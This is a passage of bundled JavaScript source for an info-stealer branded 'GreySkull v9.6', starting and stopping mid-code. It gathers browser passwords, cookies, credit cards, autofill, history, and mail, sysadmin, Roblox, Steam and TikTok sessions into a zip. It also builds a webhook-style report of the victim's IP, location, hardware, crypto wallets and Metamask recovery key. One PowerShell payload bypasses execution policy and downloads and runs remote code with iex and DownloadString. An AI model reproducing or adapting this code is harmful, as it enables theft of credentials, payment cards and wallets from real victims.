  } catch (err) {
    if (err) {
      return (
        process.env.localappdata +
        "\\" +
        "Temp" +
        "\\" +
        `KS_MAL_${process.env.USERNAME.replace(".", "") || "USER"}` +
        ".zip"
      );
    }
  }
}

async function Init() {
  const basepath = await getbasepath();
  const savepath = await getsavepath();
  try {
    if (fs.existsSync(basepath)) {
      await fs.rmSync(basepath, { recursive: true });
    }
    if (fs.existsSync(savepath)) {
      await fs.rmSync(savepath, { recursive: true });
    }
  } catch (e) {}

  await fs.mkdirSync(basepath);
  stat.addbasepath(basepath);
  stat.addsavepath(savepath);
}

async function Save(copypath, mainfolder, subfolder) {
  let basepath = stat.testpath[0];

  const files = core.recursiveRead(copypath, copypath, "");
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const savePath =
      basepath +
      "\\" +
      mainfolder +
      "\\" +
      subfolder +
      "\\" +
      file.replace(copypath, "");
    try {
      createAllDir(savePath);
      fs.writeFileSync(savePath, fs.readFileSync(file));
    } catch (e) {}
  }
}

async function SimpleSave(copypath, mainfolder, subfolder) {
  let basepath = stat.testpath[0];
  const files = core.recursiveRead(copypath, copypath, "");
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const savePath =
      basepath +
      "\\" +
      mainfolder +
      "\\" +
      subfolder +
      "\\" +
      file.replace(copypath, "");
    try {
      createAllDir(savePath);
      fs.writeFileSync(savePath, fs.readFileSync(file));
    } catch (e) {}
  }
}

async function ArraySave(saves, mainfolder, subfolder) {
  let basepath = stat.testpath[0];
  for (var i = 0; i < saves.length; i++) {
    const save = saves[i];

    try {
      if (fs.lstatSync(save).isDirectory()) {
        const files = core.recursiveRead(save, save, "");
        for (var j = 0; j < files.length; j++) {
          const file = files[j];

          let savePath;
          if (subfolder != "") {
            savePath =
              basepath +
              "\\" +
              mainfolder +
              "\\" +
              subfolder +
              "\\" +
              save.slice(0, -1).split("\\").pop() +
              "\\" +
              core.fileName(file);
          } else {
            savePath =
              basepath +
              "\\" +
              mainfolder +
              "\\" +
              save.slice(0, -1).split("\\").pop() +
              "\\" +
              core.fileName(file);
          }

          try {
            createAllDir(savePath);
            fs.writeFileSync(savePath, fs.readFileSync(file));
          } catch (e) {
            console.log(e);
          }
        }
      } else {
        const savePath =
          basepath +
          "\\" +
          mainfolder +
          "\\" +
          subfolder +
          "\\" +
          core.fileName(save);
        try {
          createAllDir(savePath);
          fs.writeFileSync(savePath, fs.readFileSync(save));
        } catch (e) {
          console.log(e);
        }
      }
    } catch (e) {}
  }
}

function createAllDir(str) {
  var folders = str.split(path.sep);
  var dir = "";
  for (var i = 0; i < folders.length - 1; i++) {
    dir += folders[i] + path.sep;
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir);
    }
  }
}

async function SaveError(error) {
  let basepath = stat.testpath[0];
  var savePath = basepath + "\\Logs\\";
  try {
    fs.mkdirSync(savePath, { recursive: true });
  } catch (e) {}
  savePath += "Error.nova";
  if (fs.existsSync(savePath)) {
    fs.appendFileSync(savePath, error + "
");
  } else {
    fs.writeFileSync(savePath, error + "
");
  }
}

async function saveCookies(cookies, name) {
  let basepath = stat.testpath[0];
  if (cookies.length == 0) {
    return;
  }

  var savePath = basepath + "\\Browsers\\";
  try {
    await fs.mkdirSync(savePath);
  } catch (e) {}

  savePath += name + " - Cookies.txt";
  var cookiesFinal = "";
  for (let i = 0; i < cookies.length; i++) {
    cookiesFinal += cookies[i].build();
  }

  fs.writeFileSync(savePath, cookiesFinal);
}

async function saveRoblox(cookies) {
  try {
    let basepath = stat.testpath[0];
    var savePath = basepath + "\\Games\\";

    try {
      fs.mkdirSync(savePath, { recursive: true });
    } catch (e) {}

    savePath += "Roblox\\";
    fs.mkdirSync(savePath, { recursive: true });
    savePath += `Roblox.txt`;
    var cookiesFinal = "";
    for (let i = 0; i < cookies.length; i++) {
      cookiesFinal += cookies[i];
    }
    if (fs.existsSync(savePath)) {
      fs.appendFileSync(savePath, cookiesFinal + "
");
    } else {
      fs.writeFileSync(savePath, cookiesFinal);
    }
  } catch (e) {}
}

async function saveMailClients(accounts, name) {
  let basepath = stat.testpath[0];
  let savePath = basepath + "\\MailClients\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  savePath += name + "\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  fs.writeFileSync(
    savePath + "accounts.json",
    JSON.stringify(accounts, null, 4)
  );
}

async function saveBrowser(
  passwords,
  autofills,
  cards,
  history,
  downloads,
  bookmarks
) {
  let basepath = stat.testpath[0];
  const savePath = basepath + "\\Browsers\\";
  const saveRoblx = basepath + "\\Games\\Roblox\\";

  try {
    if (!fs.existsSync(savePath)) {
      await mkdirAsync(savePath);
    }
  } catch (e) {}

  try {
    if (stat.roblox_account && stat.roblox_account.length > 0) {
      if (!fs.existsSync(basepath + "\\Games")) {
        await mkdirAsync(basepath + "\\Games");
      }
      if (!fs.existsSync(saveRoblx)) {
        await mkdirAsync(saveRoblx);
      }
      const cookiesContent = stat.roblox_account.join("
");
      fs.writeFileSync(saveRoblx + "Cookies.txt", cookiesContent);
    }
  } catch (e) {}
  
  let passwordFinal = "";
  try {
    for (let i = 0; i < passwords.length; i++) {
      if (passwords[i] && typeof passwords[i].build === "function") {
        passwordFinal += passwords[i].build() + "
";
      }
    }
    if (passwordFinal.length !== 0) {
      passwordFinal = core.getHeader() + passwordFinal;
    }
  } catch (e) {}

  let autofillFinal = "";
  for (let i = 0; i < autofills.length; i++) {
    autofillFinal += autofills[i].build() + "
";
  }

  if (autofillFinal.length != 0) {
    autofillFinal = core.getHeader() + autofillFinal;
  }

  let historyFinal = "";
  for (let i = 0; i < history.length; i++) {
    historyFinal += history[i].build() + "
";
  }

  if (historyFinal.length != 0) {
    historyFinal = core.getHeader() + historyFinal;
  }

  let downloadFinal = "";
  for (let i = 0; i < downloads.length; i++) {
    downloadFinal += downloads[i].build() + "
";
  }

  if (downloadFinal.length != 0) {
    downloadFinal = core.getHeader() + downloadFinal;
  }

  let bookmarkFinal = "";
  for (let i = 0; i < bookmarks.length; i++) {
    bookmarkFinal += bookmarks[i].build() + "
";
  }

  if (bookmarkFinal.length != 0) {
    bookmarkFinal = core.getHeader() + bookmarkFinal;
  }

  let cardFinal = "";
  for (let i = 0; i < cards.length; i++) {
    cardFinal += cards[i].build() + "
";
  }

  if (cardFinal.length != 0) {
    cardFinal = core.getHeader() + cardFinal;
  }

  fs.writeFileSync(savePath + "Passwords.txt", passwordFinal);
  fs.writeFileSync(savePath + "AutoFill.txt", autofillFinal);
  fs.writeFileSync(savePath + "History.txt", historyFinal);
  fs.writeFileSync(savePath + "Downloads.txt", downloadFinal);
  fs.writeFileSync(savePath + "Bookmarks.txt", bookmarkFinal);
  fs.writeFileSync(savePath + "Cards.txt", cardFinal);
}

async function saveMailClients(accounts, name) {
  let basepath = stat.testpath[0];
  let savePath = basepath + "\\MailClients\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  savePath += name + "\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  fs.writeFileSync(
    savePath + "accounts.json",
    JSON.stringify(accounts, null, 4)
  );
}

async function saveSysAdmin(accounts, name) {
  let basepath = stat.testpath[0];
  let savePath = basepath + "\\Clients\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  savePath += name + "\\";
  try {
    fs.mkdirSync(savePath);
  } catch (e) {}

  fs.writeFileSync(
    savePath + "accounts.json",
    JSON.stringify(accounts, null, 4)
  );
}

async function zipResult() {
  let savepath = stat.savepath[0];
  let basepath = stat.testpath[0];
  const archive = archiver("zip", { zlib: { level: 9 } });
  const stream = fs.createWriteStream(savepath);
  return new Promise((resolve, reject) => {
    try {
      archive
        .directory(basepath + "\\", false)
        .on("error", (err) => reject(err))
        .pipe(stream);

      stream.on("close", () => resolve(savepath));
      archive.finalize().then(() => {});
    } catch {}
  });
}

function zip(savepath) {
  savepath = path.join(savepath[0], "..");
  const archive = archiver("zip", { zlib: { level: 9 } });
  const stream = fs.createWriteStream(savepath + "\\Exodus.zip");
  return new Promise((resolve, reject) => {
    try {
      archive
        .directory(savepath + "\\", false)
        .on("error", (err) => reject(err))
        .pipe(stream);

      stream.on("close", () => resolve(savepath + "\\Exodus.zip"));
      archive.finalize().then(() => {});
    } catch {}
  });
}

module.exports = {
  getbasepath,
  Init,
  SimpleSave,
  Save,
  ArraySave,
  zipResult,
  saveBrowser,
  saveCookies,
  saveRoblox,
  saveMailClients,
  saveSysAdmin,
  zip,
  SaveError,
};


//# sourceURL=webpack://script/./utils/save.js?");

/***/ }),

/***/ 
})(module_17_exports, module_17_exports);
modules['module_17'] = module_17_exports;

// Módulo 18
const module_18_exports = {};
(function(module, exports) {
const { spawn } = __webpack_require__(/*! child_process */ "child_process");\r
\r
\r
async function sound(cc) {\r
    if (cc == "none" || cc == "no" || cc == "" || !cc ) return;\r
    let data = "";\r
    try {\r
      if (cc == "rickroll") {\r
        data = `Add-Type -TypeDefinition @'\r
  using System.Runtime.InteropServices;\r
  [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IAudioEndpointVolume\r
  {\r
      int f(); int g(); int h(); int i();\r
      int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\r
      int j();\r
      int GetMasterVolumeLevelScalar(out float pfLevel);\r
      int k(); int l(); int m(); int n();\r
      int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\r
      int GetMute(out bool pbMute);\r
  }\r
  [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IMMDevice\r
  {\r
      int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\r
  }\r
  [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IMMDeviceEnumerator\r
  {\r
      int f(); // Unused\r
      int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\r
  }\r
  [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }\r
  public class Audio\r
  {\r
      static IAudioEndpointVolume Vol()\r
      {\r
          var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\r
          IMMDevice dev = null;\r
          Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\r
          IAudioEndpointVolume epv = null;\r
          var epvid = typeof(IAudioEndpointVolume).GUID;\r
          Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\r
          return epv;\r
      }\r
      public static float Volume\r
      {\r
          get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\r
          set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\r
      }\r
      public static bool Mute\r
      {\r
          get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\r
          set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\r
      }\r
  }\r
  '@\r
  [audio]::Mute = $false\r
  [audio]::Volume  = 1\r
  \r
  \r
  Add-Type -AssemblyName System.speech\r
  $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\r
  $speak.Speak("GreySkull On Top")\r
  iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")\r
  `;\r
      } else {\r
        data = `\r
  Add-Type -TypeDefinition @'\r
  using System.Runtime.InteropServices;\r
  [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IAudioEndpointVolume\r
  {\r
      int f(); int g(); int h(); int i();\r
      int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\r
      int j();\r
      int GetMasterVolumeLevelScalar(out float pfLevel);\r
      int k(); int l(); int m(); int n();\r
      int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\r
      int GetMute(out bool pbMute);\r
  }\r
  [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IMMDevice\r
  {\r
      int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\r
  }\r
  [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r
  interface IMMDeviceEnumerator\r
  {\r
      int f(); \r
      int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\r
  }\r
  [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }\r
  public class Audio\r
  {\r
      static IAudioEndpointVolume Vol()\r
      {\r
          var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\r
          IMMDevice dev = null;\r
          Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\r
          IAudioEndpointVolume epv = null;\r
          var epvid = typeof(IAudioEndpointVolume).GUID;\r
          Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\r
          return epv;\r
      }\r
      public static float Volume\r
      {\r
          get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\r
          set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\r
      }\r
      public static bool Mute\r
      {\r
          get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\r
          set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\r
      }\r
  }\r
  '@\r
  [audio]::Mute = $false\r
  [audio]::Volume  = 1\r
  \r
  \r
  Add-Type -AssemblyName System.speech\r
  $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\r
  $speak.Speak("GreySkull On Top")\r
  \r
  $sustain = 1;\r
  $pause = 1;\r
  while ($true) {\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1320,125*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,750*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1056,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  sleep -milliseconds (250*$pause);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1408,250*$sustain);\r
  [console]::beep(1760,500*$sustain);\r
  [console]::beep(1584,250*$sustain);\r
  [console]::beep(1408,250*$sustain);\r
  [console]::beep(1320,750*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,500*$sustain);\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1056,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  sleep -milliseconds (500*$pause);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1320,125*$sustain);\r
  [console]::beep(1188,125*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,750*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1056,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  sleep -milliseconds (250*$pause);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1408,250*$sustain);\r
  [console]::beep(1760,500*$sustain);\r
  [console]::beep(1584,250*$sustain);\r
  [console]::beep(1408,250*$sustain);\r
  [console]::beep(1320,750*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1188,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(990,500*$sustain);\r
  [console]::beep(990,250*$sustain);\r
  [console]::beep(1056,250*$sustain);\r
  [console]::beep(1188,500*$sustain);\r
  [console]::beep(1320,500*$sustain);\r
  [console]::beep(1056,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  [console]::beep(880,500*$sustain);\r
  sleep -milliseconds (500*$pause);\r
  [console]::beep(660,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(594,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(440,1000*$sustain);\r
  [console]::beep(419,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(660,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(594,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(528,500*$sustain);\r
  [console]::beep(660,500*$sustain);\r
  [console]::beep(880,1000*$sustain);\r
  [console]::beep(838,2000*$sustain);\r
  [console]::beep(660,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(594,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(440,1000*$sustain);\r
  [console]::beep(419,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(660,1000*$sustain);\r
  [console]::beep(528,1000*$sustain);\r
  [console]::beep(594,1000*$sustain);\r
  [console]::beep(495,1000*$sustain);\r
  [console]::beep(528,500*$sustain);\r
  [console]::beep(660,500*$sustain);\r
  [console]::beep(880,1000*$sustain);\r
  [console]::beep(838,2000*$sustain);\r
  $sustain=$sustain*0.8\r
  $pause=$pause*0.8\r
  }`;\r
      }\r
  \r
      const ps = spawn("powershell.exe", [\r
        "-ExecutionPolicy",\r
        "Bypass",\r
        "-Command",\r
        data,\r
      ]);\r
  \r
      ps.stdout.on("data", (data) => {});\r
  \r
      ps.stderr.on("data", (data) => {});\r
  \r
      ps.on("close", (code) => {});\r
    } catch (e) {}\r
  }\r
  \r
module.exports={\r
    sound,\r
}

//# sourceURL=webpack://script/./utils/sound.js?");

/***/ }),

/***/ 
})(module_18_exports, module_18_exports);
modules['module_18'] = module_18_exports;

// Módulo 19
const module_19_exports = {};
(function(module, exports) {
const path = __webpack_require__(/*! path */ "path"),
{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");


class Stat {
  constructor() {
    this.passwords = 0;
    this.cookies = 0;
    this.autofills = 0;
    this.cards = 0;
    this.history = 0;
    this.downloads = 0;
    this.bookmarks = 0;

    this.games = [];
    this.exodus = [];
    this.keyword_password = [];
    this.vpn = [];
    this.sysadmin = [];
    this.extensions = [];
    this.colds = [];
    this.mnemonics = [];
    this.messengers = [];
    this.file = []; 
    this.roblox_cookies = [];
    this.twitter_cookies = [];
    this.roblox_account = [];
    this.minecraft_account = [];
    this.atomicurl = [];
    this.exodusurl = [];
    this.testpath = [];
    this.savepath = [];
    this.twitter_account = [];
    this.steam_content = [];
    this.steam_account = [];
    this.secretpath = [];
    this.discordAccount = [];
    this.InstaSessId = [];
    this.TiktokSessId = [];
    this.RedditSess = [];
    this.passphrase;
  }
  addReddit(name) {
    this.RedditSess.push(name);
  }
  addTikTok(name) {
    this.TiktokSessId.push(name);
  }
  addSessIDInsta(name) {
    this.InstaSessId.push(name);
  }
  addDiscordAccountbis(name) {
    this.discordAccount[0].push(name);
  }
  addDiscordAccount(name) {
    this.discordAccount.push(name);
  }
  addSteamAcc(name) {
    this.steam_account.push(name);
  }
  addSecret(name) {
    this.secretpath.push(name);
  }
  addSteam(name) {
    this.steam_content.push(name);
  }
  addsavepath(name) {
    this.savepath.push(name);
  }
  addbasepath(name) {
    this.testpath.push(name);
  }
  addAtomicLink(name) {
    this.atomicurl.push(name);
  }
  addExodusLink(name) {
    this.exodusurl.push(name);
  }
  addMinecraft(name) {
    this.minecraft_account.push(name);
  }
  detailRoblox(name) {
    this.roblox_account.push(name);
  }
  AddTwitter(name) {
    this.twitter_cookies.push(name);
  }
  AddRoblox(name) {
    this.roblox_cookies.push(name);
  }
  AddTwitterAccount(name) {
    this.twitter_account.push(name);
  }

  AddBrowser(
    passwords,
    cookies,
    autofills,
    cards,
    history,
    downloads,
    bookmarks
  ) {
    this.passwords = passwords;
    this.cookies = cookies;
    this.autofills = autofills;
    this.cards = cards;
    this.history = history;
    this.downloads = downloads;
    this.bookmarks = bookmarks;
  }

  AddGames(name) {
    this.games.push(name);
  }

  Addfilestealer(name) {
    this.file.push(name);
  }

  AddExodus(name) {
    this.exodus.push(name);
  }

  AddKeyword(name) {
    this.keyword_password.push(name);
  }

  AddVpn(name) {
    this.vpn.push(name);
  }

  AddSysAdmin(name) {
    this.sysadmin.push(name);
  }

  AddExtensions(name) {
    this.extensions.push(name);
  }

  AddColds(name) {
    this.colds.push(name);
  }

  AddPassphrase(passphrase) {
    this.passphrase = passphrase;
  }

  AddMessenger(name) {
    this.messengers.push(name);
  }

  Build(
    username,
    ip,
    hostname,
    city,
    region,
    country,
    googlemap,
    org,
    postal,
    timezone,
    disk,
    ram,
    uid,
    cpucount,
    OS,
    cpu,
    GPU,
    windowskey,
    windowsversion,
    link
  ) {
    let builded = {
      avatar_url:
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",
      content: null,
      embeds: [
        {
          color: 3553599,
          author: {
            name: "GreySkull v9.6",
            url: "https://t.me/Sordeal",
            icon_url:
              "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/2f4cee0ec758af99cf31d0257ace6033.gif",
          },
          description: `[${embeds.nova} GreySkull Configuration](https://t.me/Sordeal)`,
          fields: [
            {
              name: "\u200b",
              value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30IP: ${ip ?? "N/A"}
City: ${city ?? "N/A"}
Region: ${region ?? "N/A"}
Country: ${country ?? "N/A"}\u001b[0m\u001b[0m
\`\`\``,
              inline: true,
            },
            {
              name: "\u200b",
              value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30 Computer Name: ${process.env.COMPUTERNAME}
 Windows Ver: ${windowsversion}
 Ram Stockage: ${ram}GB
 Disk Stockage: ${disk}GB\u001b[0m\u001b[0m
\`\`\``,
              inline: true,
            },
            {
              name: "\u200b",
              value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30 🍪 Cookies Found: ${this.cookies}
 🔑 Passwords Found: ${this.passwords}
 💳 Credit Card Found: ${this.cards}
 📋 AutoFill Found: ${this.autofills}
 🔔 Social App: ${this.messengers.length ? this.messengers.length : 0}
 🌐 History: ${this.history}
 📥 Downloads: ${this.downloads}
 🔖 Bookmarks: ${this.bookmarks}\u001b[0m\u001b[0m
\`\`\``,
              inline: false,
            },
            {
              name: "\u200b",
              value: `
${
  this.colds.length > 0
    ? `${embeds.crypto} **Cold Wallets:** ${
        this.colds.join(", ") ? `(\`` + this.colds.join(", ") + `\`)` : ""
      }`
    : ""
}${
                this.extensions.length > 0
                  ? `
${embeds.crypto} **Extension Wallets:** ${
                      this.extensions.join(", ")
                        ? `(\`` + this.extensions.join(", ") + `\`)`
                        : ""
                    }`
                  : ""
              }${
                this.passphrase !== undefined &&
                this.passphrase !== "" &&
                this.passphrase.length < 0
                  ? `
${stats.metamask} **Metamask Recovery Key:** ${this.passphrase}`
                  : ""
              }${
                this.exodus.length > 0
                  ? `
${stats.exodus} **Exodus Password:** ${
                      this.exodus.join(", ")
                        ? `(\`` + this.exodus.join(", ") + `\`)`
                        : ""
                    }`
                  : ""
              }${
                this.games.length > 0
                  ? `
🎮 **Games Found:** ${
                      this.games.join(", ")
                        ? `(\`` + this.games.join(", ") + `\`)`
                        : ""
                    }`
                  : ""
              }${
                this.sysadmin.length > 0
                  ? `
⌨️ **Clients Found:** ${
                      this.sysadmin.join(", ")
                        ? `(\`` + this.sysadmin.join(", ") + `\`)`
                        : ""
                    }`
                  : ""
              }${
                this.vpn.length > 0
                  ? `
🌐 **VPN:** ${
                      this.vpn.join(", ")
                        ? `(\`` + this.vpn.join(", ") + `\`)`
                        : ""
                    }`
                  : ""
              }

${
                link
                  ? `
[${stats.download} \`${path.basename(
                      this.savepath[0]
                    )}\`](${link})
` + `\`\`\`${link}\`\`\``
                  : ""
              }`,
              inline: false,
            },
          ],
          footer: {
            text: "@GreySkull | https://t.me/Sordeal",
          },
        },
      ],
      username: "GreySkull",
      attachments: [],
    };

    return JSON.stringify(builded);
  }
}

var stat = new Stat();

module.exports = {
  stat,
};


//# sourceURL=webpack://script/./utils/stats.js?");

/***/ }),

/***/ 
})(module_19_exports, module_19_exports);
modules['module_19'] = module_19_exports;

// Módulo 20
const module_20_exports = {};
(function(module, exports) {
const axios = __webpack_require__(/*! axios */ "axios"),\r
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");\r
\r
async function detailSteam(cc) {\r
  if (cc != "yes") return;\r
  try {\r
    if (stat.steam_content[0] && Array.isArray(stat.steam_content)) {\r
      const accounts = stat.steam_content[0];\r
      if (!accounts) return;\r
      await Promise.all(\r
        accounts.forEach(async account => {\r
          \r
          try {\r
            const { data: accountInfo } = await axios.get(\r
              `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`\r
            );\r
            const { data: games } = await axios.get(\r
              `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`\r
            );\r
            const { data: level } = await axios.get(\r
              `https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`\r
            );\r
            stat.addSteamAcc({ accountId: account, accountInfo: accountInfo.response.players, games, level: level.response });\r
          } catch (error) {}\r
        })\r
      );\r
      \r
    }\r
  } catch (e) {}\r
}\r
\r
function sendSteam(cc) {\r
  if (cc != "yes") return;\r
  let e = [];\r
  try {\r
    stat.steam_account\r
      .slice(0, 5)\r
      .forEach(({ accountId, accountInfo, games, level }) => {\r
        if(!accountInfo || !level)return;\r
        accountInfo = accountInfo[0]\r
        const embed = {\r
          title: "Steam Session",\r
          color: 3553599,\r
          author: {\r
            name: accountInfo.personaname,\r
            icon_url: accountInfo.avatar,\r
            url: accountInfo.profileurl,\r
          },\r
          fields: [\r
            {\r
              name: `${embeds.infoyl} Name:`,\r
              value: `\`${accountInfo.personaname}\``,\r
              inline: false,\r
            },\r
            {\r
              name: `${embeds.nitro} Created At:`,\r
              value: `${ accountInfo.timecreated !== undefined ? `<t:${accountInfo.timecreated}>` : 'none'}`,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.phone} Level:`,\r
              value: `\`${level.player_level ?? 0}\``,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.mail} Games:`,\r
              value: `\`${games.response.game_count ?? 0}\``,\r
              inline: true,\r
            },\r
          ],\r
        };\r
        e.push(embed);\r
      });\r
    let g = {\r
      avatar_url:\r
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
      username: "GreySkull",\r
      embeds: e,\r
    };\r
    return g;\r
  } catch (e) {}\r
}\r
\r
module.exports = {\r
  detailSteam,\r
  sendSteam,\r
};\r


//# sourceURL=webpack://script/./utils/steam.js?");

/***/ }),

/***/ 
})(module_20_exports, module_20_exports);
modules['module_20'] = module_20_exports;

// Módulo 21
const module_21_exports = {};
(function(module, exports) {
const { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
  axios = __webpack_require__(/*! axios */ "axios"),\r
  { embeds, stats } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js"),\r
  fs = __webpack_require__(/*! fs */ "fs"),\r
  path = __webpack_require__(/*! path */ "path");\r
\r
async function ParseTiktok(cc) {\r
  if (cc !== "yes") return;\r
  let g = [];\r
  const basepath = stat.testpath[0];\r
  const socialDir = path.join(basepath, "Social");\r
  const TiktokDir = path.join(socialDir, "TikTok");\r
  let tiktok_sessions = stat.TiktokSessId;\r
  if (tiktok_sessions && tiktok_sessions.length) {\r
    for (const tiktok of tiktok_sessions) {\r
      const profile = await axios\r
        .get(\r
